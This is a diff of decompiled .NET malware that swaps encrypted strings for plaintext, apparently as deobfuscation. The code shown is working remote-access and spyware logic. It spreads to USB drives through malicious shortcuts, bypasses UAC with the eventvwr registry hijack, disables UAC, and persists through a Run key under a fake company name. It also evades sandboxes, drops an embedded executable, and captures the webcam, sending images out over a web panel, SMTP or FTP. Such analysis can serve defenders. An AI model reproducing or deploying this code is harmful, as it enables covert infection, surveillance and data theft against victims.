@@ -299,7 +299,7 @@ internal sealed class N
 						try
 						{
 							File.SetAttributes(text, FileAttributes.Normal);
-							if (text.ToLower().EndsWith(O.I("Fp9VrnIMHW1gb6lQZD/p7g==")))
+							if (text.ToLower().EndsWith(".lnk"))
 							{
 								File.Delete(text);
 							}
@@ -362,31 +362,31 @@ internal sealed class N
 							string[] files = Directory.GetFiles(driveInfo.Name);
 							foreach (string text in files)
 							{
-								if ((Operators.CompareString(Path.GetExtension(text).ToLower(), O.I("Fp9VrnIMHW1gb6lQZD/p7g=="), false) != 0) & (Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + ExeName.ToLower(), false) != 0))
+								if ((Operators.CompareString(Path.GetExtension(text).ToLower(), ".lnk", false) != 0) & (Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + ExeName.ToLower(), false) != 0))
 								{
 									File.SetAttributes(text, FileAttributes.Hidden);
-									File.Delete(driveInfo.Name + new FileInfo(text).Name + O.I("Fp9VrnIMHW1gb6lQZD/p7g=="));
-									object instance = NewLateBinding.LateGet(Interaction.CreateObject(O.I("7cUT2ztMdtc/tR7lMGy3/Q==")), null, O.I("Ub3Nni0I8+jKsJJSkd9efg=="), new object[1]
+									File.Delete(driveInfo.Name + new FileInfo(text).Name + ".lnk");
+									object instance = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell"), null, "CreateShortcut", new object[1]
 									{
-										driveInfo.Name + new FileInfo(text).Name + O.I("Fp9VrnIMHW1gb6lQZD/p7g==")
+										driveInfo.Name + new FileInfo(text).Name + ".lnk"
 									}, null, null, null);
-									NewLateBinding.LateSetComplex(instance, null, O.I("zh6FDYZwMREtCLFw0/8+Dw=="), new object[1]
+									NewLateBinding.LateSetComplex(instance, null, "TargetPath", new object[1]
 									{
-										O.I("bBNzVHKageQQMrpfwfYjwA==")
+										"cmd.exe"
 									}, null, null, false, true);
-									NewLateBinding.LateSetComplex(instance, null, O.I("ISn75Uxf1qJFrNZ3GcLXJgrDYj6QBRRHvmW6lxT3KPE="), new object[1]
+									NewLateBinding.LateSetComplex(instance, null, "WorkingDirectory", new object[1]
 									{
 										""
 									}, null, null, false, true);
-									NewLateBinding.LateSetComplex(instance, null, O.I("LQ+rkKdofu1BUQYrxppV7g=="), new object[1]
+									NewLateBinding.LateSetComplex(instance, null, "Arguments", new object[1]
 									{
-										O.I("oqGnczAZJSK6F9S7S6a3XA==") + ExeName.Replace(O.I("0XuB4qT44kEu3Z0S79ooOg=="), O.I("mAYMU1K6wwXlVzDi/8gUlQ==")) + O.I("m5sFJydimaw946sNTl03BA==") + new FileInfo(text).Name.Replace(O.I("0XuB4qT44kEu3Z0S79ooOg=="), O.I("mAYMU1K6wwXlVzDi/8gUlQ==")) + O.I("z6o52Sz4f4AONENfKjha+g==")
+										"/c start " + ExeName.Replace( "", "\" \"") + "&start " + new FileInfo(text).Name.Replace(" " , "\" \"") + " & exit"
 									}, null, null, false, true);
-									NewLateBinding.LateSetComplex(instance, null, O.I("B+Y2F0yLiLoyLH1c39BjJw=="), new object[1]
+									NewLateBinding.LateSetComplex(instance, null, "IconLocation", new object[1]
 									{
 										GetIcon(Path.GetExtension(text))
 									}, null, null, false, true);
-									NewLateBinding.LateCall(instance, null, O.I("gJqzxsggdCLJ3/NcTb5XcQ=="), new object[0], null, null, null, true);
+									NewLateBinding.LateCall(instance, null, "Save", new object[0], null, null, null, true);
 									instance = null;
 								}
 							}
@@ -394,28 +394,28 @@ internal sealed class N
 							foreach (string path in directories)
 							{
 								File.SetAttributes(path, FileAttributes.Hidden);
-								File.Delete(driveInfo.Name + new DirectoryInfo(path).Name + O.I("dhxz9In2pvX1xJaeBcJSbg=="));
-								object instance2 = NewLateBinding.LateGet(Interaction.CreateObject(O.I("7cUT2ztMdtc/tR7lMGy3/Q==")), null, O.I("Ub3Nni0I8+jKsJJSkd9efg=="), new object[1]
+								File.Delete(driveInfo.Name + new DirectoryInfo(path).Name + " .lnk");
+								object instance2 = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell"), null, "CreateShortcut", new object[1]
 								{
-									driveInfo.Name + Path.GetFileNameWithoutExtension(path) + O.I("dhxz9In2pvX1xJaeBcJSbg==")
+									driveInfo.Name + Path.GetFileNameWithoutExtension(path) + " .lnk"
 								}, null, null, null);
-								NewLateBinding.LateSetComplex(instance2, null, O.I("zh6FDYZwMREtCLFw0/8+Dw=="), new object[1]
+								NewLateBinding.LateSetComplex(instance2, null, "TargetPath", new object[1]
 								{
-									O.I("bBNzVHKageQQMrpfwfYjwA==")
+									"cmd.exe"
 								}, null, null, false, true);
-								NewLateBinding.LateSetComplex(instance2, null, O.I("ISn75Uxf1qJFrNZ3GcLXJgrDYj6QBRRHvmW6lxT3KPE="), new object[1]
+								NewLateBinding.LateSetComplex(instance2, null, "WorkingDirectory", new object[1]
 								{
 									""
 								}, null, null, false, true);
-								NewLateBinding.LateSetComplex(instance2, null, O.I("LQ+rkKdofu1BUQYrxppV7g=="), new object[1]
+								NewLateBinding.LateSetComplex(instance2, null, "Arguments", new object[1]
 								{
-									O.I("oqGnczAZJSK6F9S7S6a3XA==") + ExeName.Replace(O.I("0XuB4qT44kEu3Z0S79ooOg=="), O.I("mAYMU1K6wwXlVzDi/8gUlQ==")) + O.I("/ikyUZUxAvBns3XwMmet+6yOE//WPtjZdZMzm+ivrpU=") + new DirectoryInfo(path).Name + O.I("wbqyF1LirzZVagLFdhfxiw==")
+									"/c start " + ExeName.Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(path).Name + "\" & exit"
 								}, null, null, false, true);
-								NewLateBinding.LateSetComplex(instance2, null, O.I("B+Y2F0yLiLoyLH1c39BjJw=="), new object[1]
+								NewLateBinding.LateSetComplex(instance2, null, "IconLocation", new object[1]
 								{
-									O.I("Oxkvp0X4DfChJnPmExtOrDcT9kATcZHjgbFya7cQH/lu4h5gIx78O788h5WpmT3i")
+									@"%SystemRoot%\system32\SHELL32.dll,3"
 								}, null, null, false, true);
-								NewLateBinding.LateCall(instance2, null, O.I("gJqzxsggdCLJ3/NcTb5XcQ=="), new object[0], null, null, null, true);
+								NewLateBinding.LateCall(instance2, null, "Save", new object[0], null, null, null, true);
 								instance2 = null;
 							}
 						}
@@ -442,10 +442,10 @@ internal sealed class N
 		{
 			try
 			{
-				object instance = Registry.LocalMachine.OpenSubKey(O.I("mRHmVzVbphgmY4lkYv3UdR3SQbnZtbGHhNxMPnTRl9s="), false);
-				string memberName = O.I("tpVhhSFpkRjM88IKq7yeMA==");
+				object instance = Registry.LocalMachine.OpenSubKey(@"Software\Classes\", false);
+				string memberName = "OpenSubKey";
 				object[] array = new object[1];
-				string memberName2 = O.I("tpVhhSFpkRjM88IKq7yeMA==");
+				string memberName2 = "OpenSubKey";
 				object[] array2 = new object[2]
 				{
 					ext,
@@ -461,18 +461,18 @@ internal sealed class N
 				{
 					ext = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
 				}
-				array[0] = Operators.ConcatenateObject(NewLateBinding.LateGet(instance2, null, O.I("bqPKoDEMgn6vlPbHCTKXww=="), new object[1]
+				array[0] = Operators.ConcatenateObject(NewLateBinding.LateGet(instance2, null, "GetValue", new object[1]
 				{
 					""
-				}, null, null, null), O.I("5ZfDSi3G9sGm6dAzMtR6IA=="));
-				string text = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, memberName, array, null, null, null), null, O.I("bqPKoDEMgn6vlPbHCTKXww=="), new object[2]
+				}, null, null, null), @"\DefaultIcon\");
+				string text = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(instance, null, memberName, array, null, null, null), null, "GetValue", new object[2]
 				{
 					"",
 					""
 				}, null, null, null));
-				if (!text.Contains(O.I("NqAVeuyg+CiFTXJkUC6lbw==")))
+				if (!text.Contains(","))
 				{
-					text += O.I("X81NGRQLsC9VKemXA8RnMw==");
+					text += ",0";
 				}
 				return text;
 			}
@@ -1974,10 +1974,7 @@ internal sealed class N
 
 	private static void IY(string ZCE_107)
 	{
-		//Discarded unreachable code: IL_00ab, IL_00f9, IL_010c
-		//IL_0103: Expected O, but got I4
-		//IL_0104: Expected O, but got I4
-		int num = Conversions.ToInteger(W.F_4.Registry.GetValue(O.I("K0ocYJdpSlFAvhxHrgztFQgMSAGTR4Y34Eo23ag/X4fpmLi/O+20Ac6XwZSCbadNtIahNa80MTpAMCWN3QkiFxfHyRWD2OvLT9n8OC99lDs="), O.I("1jb8AudXf9ptWpuwzIAMvw=="), O.I("84htGJR8cIVATCAwL9pcMw==")));
+		int num = Conversions.ToInteger(W.F_4.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "1"));
 		if (num == 0 || !File.Exists(ZCE_107))
 		{
 			return;
@@ -1985,19 +1982,19 @@ internal sealed class N
 		try
 		{
 			string pathRoot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
-			string path = O.I("snFXrTN/4vrhyPiQz6AoZle45MW1/pvBOpAk1tXUlNC98Yy6Rg7ckGphRLmOhs6Oxl/10aTv374bQoAt24Dnwg==");
+			string path = @"Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
 			string arg = Path.Combine(pathRoot, path);
-			string value = string.Format(O.I("oGpCwgqOkJq8UqTqtMOP0KF6c4aLUXG+BYc9qTCrzRp+5exBSn8F2AmSWS1DwVn5"), arg, ZCE_107);
+			string value = string.Format("{0} Start-Process -FilePath {1} -wait", arg, ZCE_107);
 			using (RegistryKey registryKey = Registry.CurrentUser)
 			{
-				using (RegistryKey registryKey2 = registryKey.CreateSubKey(O.I("LvWpYUoNhLQcAEZrUU5vJXfm8AMpWkioRks6kR/avF7AxNEH3J8ItHmpZzPVbkQo")))
+				using (RegistryKey registryKey2 = registryKey.CreateSubKey(@"SOFTWARE\Classes\mscfile\shell\open\command"))
 				{
 					registryKey2.SetValue("", value, RegistryValueKind.String);
 				}
 			}
-			Process.Start(O.I("Cho8lYiplWIp97x+d9e+Ww=="));
+			Process.Start("eventvwr.exe");
 			Thread.Sleep(5000);
-			Registry.CurrentUser.DeleteSubKeyTree(O.I("LvWpYUoNhLQcAEZrUU5vJc44VbAVyLVOc2pC4FTD8xE="));
+			Registry.CurrentUser.DeleteSubKeyTree(@"SOFTWARE\Classes\mscfile");
 		}
 		catch (Exception ex)
 		{
@@ -2037,14 +2034,14 @@ internal sealed class N
 		if (QR_66)
 		{
 			string oSFullName = W.F_4.Info.OSFullName;
-			if (oSFullName.Contains(O.I("jt4JXyzFY+P3zf6k/0mkCA==")) | oSFullName.Contains(O.I("WY/qFt+dX2Df9KlaXwh7Dg==")) | oSFullName.Contains(O.I("yELl4NlRz7vMnB6B63zUbg==")))
+			if (oSFullName.Contains("Windows 7") | oSFullName.Contains("Windows 8") | oSFullName.Contains("Windows 10"))
 			{
-				int num = Conversions.ToInteger(W.F_4.Registry.GetValue(O.I("K0ocYJdpSlFAvhxHrgztFQgMSAGTR4Y34Eo23ag/X4fpmLi/O+20Ac6XwZSCbadNtIahNa80MTpAMCWN3QkiFxfHyRWD2OvLT9n8OC99lDs="), O.I("1jb8AudXf9ptWpuwzIAMvw=="), O.I("84htGJR8cIVATCAwL9pcMw==")));
+				int num = Conversions.ToInteger(W.F_4.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "1"));
 				if (num == 1)
 				{
 					try
 					{
-						W.F_4.Registry.SetValue(O.I("K0ocYJdpSlFAvhxHrgztFQgMSAGTR4Y34Eo23ag/X4fpmLi/O+20Ac6XwZSCbadNtIahNa80MTpAMCWN3QkiFxfHyRWD2OvLT9n8OC99lDs="), O.I("1jb8AudXf9ptWpuwzIAMvw=="), O.I("h70oAKbD4BDUEdcNDLfT7A=="));
+						W.F_4.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "0");
 					}
 					catch (Exception projectError)
 					{
@@ -2063,9 +2060,9 @@ internal sealed class N
 		LK_65 = Assembly.GetExecutingAssembly().Location;
 		if (Operators.CompareString(LK_65, MW_60, false) != 0 && _D_61)
 		{
-			if (!Directory.Exists(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("ID4aR7+bK8IdI54xBnuTyqcjZ78LQellPpO3LVEog0U=")))
+			if (!Directory.Exists(Environment.GetEnvironmentVariable("appdata") + @"\Oxford Health Plans Inc\"))
 			{
-				Directory.CreateDirectory(Environment.GetEnvironmentVariable(O.I("haLsi+cj0yodiuWmM+o4Wg==")) + O.I("ID4aR7+bK8IdI54xBnuTyqcjZ78LQellPpO3LVEog0U="));
+				Directory.CreateDirectory(Environment.GetEnvironmentVariable("appdata") + @"\Oxford Health Plans Inc\");
 			}
 			try
 			{
@@ -2119,9 +2116,9 @@ internal sealed class N
 			}
 			try
 			{
-				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(O.I("Akq+/Qobe3bW+jdjmv5oI5U7Z9BdClsizpKUb3HtChUz3SNJfwOuCb74yondCL96"), true);
-				registryKey.SetValue(O.I("/Bm1qIrqMwm3w5qHc7UQXeAcGP2RzAQYxXJDJMYbvE4="), MW_60);
-				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(O.I("3zgKylgTkBqowbdc1z3NjnOEOX1XUI3LNA3+hElyKGNAmHbSmG27g9WFRVrlNY55jpM+FkaD9WRWS635QlIX5/ibNLvQyXvdiAKH0aItVK8="), true);
+				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+				registryKey.SetValue("Oxford Health Plans Inc", MW_60);
+				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run", true);
 				if (registryKey2 != null)
 				{
 					byte[] value = new byte[12]
@@ -2139,7 +2136,7 @@ internal sealed class N
 						0,
 						0
 					};
-					registryKey2.SetValue(O.I("/Bm1qIrqMwm3w5qHc7UQXeAcGP2RzAQYxXJDJMYbvE4="), value);
+					registryKey2.SetValue("Oxford Health Plans Inc", value);
 					registryKey2.Close();
 				}
 			}
@@ -2156,7 +2153,7 @@ internal sealed class N
 		}
 		if (VT_63)
 		{
-			Interaction.Shell(O.I("IM8Uo3VnEo8+NZZe2fa0dXus9/sV0JbokGsD4pmezO4="));
+			Interaction.Shell("Shutdown -r -t 5");
 		}
 		if (QME_47)
 		{
@@ -2192,14 +2189,14 @@ internal sealed class N
 			Thread thread5 = new Thread(JX);
 			thread5.IsBackground = true;
 			thread5.Start();
-			if (VH_40 == Conversions.ToBoolean(O.I("hyNN5z+7qAsS695lDXLuHg==")))
+			if (VH_40 == Conversions.ToBoolean("True"))
 			{
 				System.Timers.Timer timer2 = new System.Timers.Timer();
 				timer2.Elapsed += XT;
 				timer2.Interval = 60000 * Conversions.ToInteger(_AL_43);
 				timer2.Enabled = true;
 			}
-			if (UCP_41 == Conversions.ToBoolean(O.I("hyNN5z+7qAsS695lDXLuHg==")))
+			if (UCP_41 == Conversions.ToBoolean("True"))
 			{
 				HFS_102 = new System.Windows.Forms.Timer();
 				HFS_102.Interval = 60000 * Conversions.ToInteger(OTI_44);
@@ -2240,9 +2237,9 @@ internal sealed class N
 			{
 				try
 				{
-					ResourceManager resourceManager = new ResourceManager(O.I("PpBkJ0OT3vPrPV9amh3tIw=="), Assembly.GetExecutingAssembly());
-					byte[] bytes = (byte[])resourceManager.GetObject(O.I("PpBkJ0OT3vPrPV9amh3tIw=="));
-					MU_73 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Environment.GetEnvironmentVariable(O.I("cWUeT8dJU4KfzxUEgGflzQ==")) + O.I("FtO3o9x/w+Ole8I84aAzLw=="), LI(3)), O.I("Nhb0LLM4pbr57CcU1BqWFw==")));
+					ResourceManager resourceManager = new ResourceManager("Player", Assembly.GetExecutingAssembly());
+					byte[] bytes = (byte[])resourceManager.GetObject("Player");
+					MU_73 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Environment.GetEnvironmentVariable("temp") + @"\", LI(3)), ".exe"));
 					File.WriteAllBytes(MU_73, bytes);
 					Thread thread7 = new Thread(HL, 1);
 					thread7.Start();
@@ -2271,14 +2268,14 @@ internal sealed class N
 		//IL_00cc: Expected O, but got I4
 		try
 		{
-			string text = SystemInformation.UserName + O.I("FtO3o9x/w+Ole8I84aAzLw==") + SystemInformation.ComputerName;
+			string text = SystemInformation.UserName + @"\" + SystemInformation.ComputerName;
 			string[] array = new string[5]
 			{
-				O.I("4DpIaBrsoOfdxn4a8FueDw=="),
-				O.I("Xru0dArIHtnQYxKs4pujiw=="),
-				O.I("9PRYo1nwE7acjIlNFos31g=="),
-				O.I("qggC78ucn0PKPCwsg/mFNQ=="),
-				O.I("ABAtKSpwYz+95FSx8yc5Pw==")
+				"Johnson",
+				"Miller",
+				"michael",
+				"Abby",
+				"Emily"
 			};
 			bool flag = false;
 			string[] array2 = array;
@@ -2312,7 +2309,7 @@ internal sealed class N
 			try
 			{
 				object processesByName = Process.GetProcessesByName(fileNameWithoutExtension);
-				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(processesByName, null, O.I("3ufhCmF9/TPsbzyl95q0/g=="), new object[0], null, null, null), 0, false))
+				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(processesByName, null, "Length", new object[0], null, null, null), 0, false))
 				{
 					Process.Start(MU_73, Path.GetFullPath(Assembly.GetExecutingAssembly().Location));
 				}
@@ -2371,8 +2368,8 @@ internal sealed class N
 		try
 		{
 			ComputerInfo computerInfo = new ComputerInfo();
-			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(O.I("0sUXgnOipyuZBK1nlNzHJw=="), O.I("1O9YhDmJ0bVT8S2e0J6RZaOg79Sx0s0ZgAlMsO52ECRF9FbzdErSzGElM43WPd/l"));
-			ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher(O.I("1O9YhDmJ0bVT8S2e0J6RZYSivqVx/+XI3VlvwmgCHxs="));
+			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_VideoController");
+			ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
 			switch (EA_123)
 			{
 			case M.OperatingSystemName:
@@ -2382,18 +2379,18 @@ internal sealed class N
 				string result2 = default(string);
 				foreach (ManagementObject item in managementObjectSearcher2.Get())
 				{
-					result2 = item.GetPropertyValue(O.I("kkzyKhhxe0N+EYGYxKqD/A==")).ToString();
+					result2 = item.GetPropertyValue("Name").ToString();
 				}
 				return result2;
 			}
 			case M.AmountOfMemory:
-				return Conversions.ToString(Math.Round(Convert.ToDouble(Conversion.Val(computerInfo.TotalPhysicalMemory)) / 1024.0 / 1024.0, 2)) + O.I("l/SGiQBjcGCF3P/i/Wo/2Q==");
+				return Conversions.ToString(Math.Round(Convert.ToDouble(Conversion.Val(computerInfo.TotalPhysicalMemory)) / 1024.0 / 1024.0, 2)) + " MB";
 			case M.VideocardName:
 			{
 				string result3 = default(string);
 				foreach (ManagementObject item2 in managementObjectSearcher.Get())
 				{
-					result3 = item2.GetPropertyValue(O.I("kkzyKhhxe0N+EYGYxKqD/A==")).ToString();
+					result3 = item2.GetPropertyValue("Name").ToString();
 				}
 				return result3;
 			}
@@ -2402,9 +2399,9 @@ internal sealed class N
 				string inputStr = default(string);
 				foreach (ManagementObject item3 in managementObjectSearcher.Get())
 				{
-					inputStr = item3.GetPropertyValue(O.I("RDzHfesOWTU8pRYqLYeaTA==")).ToString();
+					inputStr = item3.GetPropertyValue("AdapterRAM").ToString();
 				}
-				return Conversions.ToString(Math.Round(Convert.ToDouble(Conversion.Val(inputStr)) / 1024.0 / 1024.0, 2)) + O.I("l/SGiQBjcGCF3P/i/Wo/2Q==");
+				return Conversions.ToString(Math.Round(Convert.ToDouble(Conversion.Val(inputStr)) / 1024.0 / 1024.0, 2)) + " MB";
 			}
 			default:
 			{
@@ -2416,7 +2413,7 @@ internal sealed class N
 		catch (Exception projectError)
 		{
 			ProjectData.SetProjectError(projectError);
-			string result4 = O.I("BfysXpq+8Xp+Gg6AmvPvgg==");
+			string result4 = "Unknown";
 			ProjectData.ClearProjectError();
 			return result4;
 		}
@@ -2496,37 +2493,50 @@ internal sealed class N
 		try
 		{
 			PictureBox pictureBox = new PictureBox();
-			CQU_90 = TV(O.I("QqCP6Qn7p8C/lRgf5zd8Xg=="), 1342177280, 0, 0, pictureBox.Size.Width, pictureBox.Size.Height, pictureBox.Handle.ToInt32(), 0);
+			CQU_90 = TV("WebCap", 1342177280, 0, 0, pictureBox.Size.Width, pictureBox.Size.Height, pictureBox.Handle.ToInt32(), 0);
 			if (QI(CQU_90, 1034u, 0, 0) > 0)
 			{
 				QI(CQU_90, 1076u, 30, 0);
 				QI(CQU_90, 1074u, 1, 0);
 				QI(CQU_90, 1084u, 0, 0);
 				QI(CQU_90, 1054u, 0, 0);
-				if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("6241fZEGRJ5YqlCgonSMsw==")))
+				if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture"))
 				{
-					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("6241fZEGRJ5YqlCgonSMsw=="));
-					File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("6241fZEGRJ5YqlCgonSMsw=="), FileAttributes.Hidden);
+					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture");
+					File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture", FileAttributes.Hidden);
 				}
-				System.Windows.Forms.Clipboard.GetImage().Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("NHaMN9drOOEU9VGqF00KDXl23d/v6vf8y5rXugAfYT8="), ImageFormat.Jpeg);
+				System.Windows.Forms.Clipboard.GetImage().Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg", ImageFormat.Jpeg);
 				QI(CQU_90, 1035u, CQU_90, 0);
 				DateTime now = DateTime.Now;
-				string format = O.I("+KvItdCkbJYVhD5M+8OWWuNMaKVwLuIiBwNvfWU5drw=");
+				string format = "MM/dd/yyyy HH:mm:ss";
 				if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 				{
-					string text = Convert.ToBase64String(File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("NHaMN9drOOEU9VGqF00KDXl23d/v6vf8y5rXugAfYT8=")));
-					CC(string.Format(O.I("3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntFnlhPkJpmdosUIqq2culK+naW4A1zSN94YvYMG3n6zXShd+mQHa+GPmBhQn/tDNZefNBjQR9gS68mHxjnArp+sStk4jEIxdoaAa9A1VHcUT75Ki1tN4/dEaP2VDI3FG0TF+B/ZuoIqSWkjklStLGN"), O.I("d+WTnirNAiuNRrGVgMVl5Q=="), HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, text, null, null, null, null, null, BU_72));
+					string text = Convert.ToBase64String(File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg"));
+					CC(string.Format(@"type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+client={8}
+link={9}
+username={10}
+password={11}
+screen_link={12}
+site_username={13}", "webcam", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, text, null, null, null, null, null, BU_72));
 				}
 				else if (Operators.CompareString(WEL_46, "smtp", false) == 0)
 				{
-					string iMW_ = SystemInformation.UserName + O.I("eCqe8oqjGUIRwUWqnBrrpA==") + SystemInformation.ComputerName + O.I("ligGKnENDwQBwtGNHaYwFBAC06jzt1ZraamTIwJXP/s=") + GO_71;
-					string hS_ = O.I("uNywgp3gcTTyKeIZNvtRFqDBnfUV92CQGHMsBMNEJEAOrU7d7MDLECDC0eY2zvS+RLxYKLxfIdRbffu2teOmyW+bpCfzG3tWFI35VVVduzAC2UTKPI3G+FFWlOe4MuHsqRBPFsMUzS+hvasThCodGqjQQsD5nq8mDKhfSC2GwvzScWOEowAiGyNv+0uoRhoXiKNK3rW4mFF5WcuCEqvxtcWP9lF8j1MCIEToLuId3PdK5uW6E5e+6PBBBNrqD9J/") + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>=================================================</span>";
-					MV(O.I("Y8DAKcz8EsJeHhP0Z+gY3A=="), iMW_, hS_, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("NHaMN9drOOEU9VGqF00KDXl23d/v6vf8y5rXugAfYT8="));
+					string iMW_ = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Webcam Capture From: " + GO_71;
+					string hS_ = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>=================================================</span>";
+					MV("%toemail%", iMW_, hS_, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg");
 				}
 				else if (Operators.CompareString(WEL_46, "ftp", false) == 0)
 				{
-					string format2 = O.I("I/tDnJPWEB6yySAivkY/576ixyY2gOP+bLVbbaRIV8A=");
-					VEU(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("NHaMN9drOOEU9VGqF00KDXl23d/v6vf8y5rXugAfYT8="), O.I("pGHSXD+I/RvlIAkA7O7pQg==") + LR_70.Replace(O.I("eCqe8oqjGUIRwUWqnBrrpA=="), O.I("q542gy/+wDIUJhH3OGKnNg==")) + O.I("W4bCr60vBIwmtjga81qp0A==") + GO_71 + O.I("3TzIyOOSC+3lcpPaeTxO6g==") + DateTime.Now.ToString(format2) + O.I("nt6DnDJw7JlONF3+NnP2Cw=="));
+					string format2 = "yyyy_MM_dd_HH_mm_ss";
+					VEU(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg", "Webcam_" + LR_70.Replace("/", "-") + "_IP_Adress_" + GO_71 + "_" + DateTime.Now.ToString(format2) + ".jpeg");
 				}
 			}
 		}
@@ -2563,18 +2573,18 @@ internal sealed class N
 			object obj = new WebClient();
 			try
 			{
-				string str = O.I("xnSWaDOipDguU4Wl8NB0UQ==");
-				NewLateBinding.LateCall(NewLateBinding.LateGet(obj, null, O.I("6pDz4EH7eT8CtKcZK1n6iA=="), new object[0], null, null, null), null, O.I("yOvGyrB4jDSFzAnwZLXW+w=="), new object[2]
+				string str = "3ce63074cd9dcf8";
+				NewLateBinding.LateCall(NewLateBinding.LateGet(obj, null, "Headers", new object[0], null, null, null), null, "Add", new object[2]
 				{
-					O.I("j/MpWj9c7cJlpJhmBGKrag=="),
-					Convert.ToString(O.I("QDDua4v2T/IujgOi7VZF7g==")) + str
+					"Authorization",
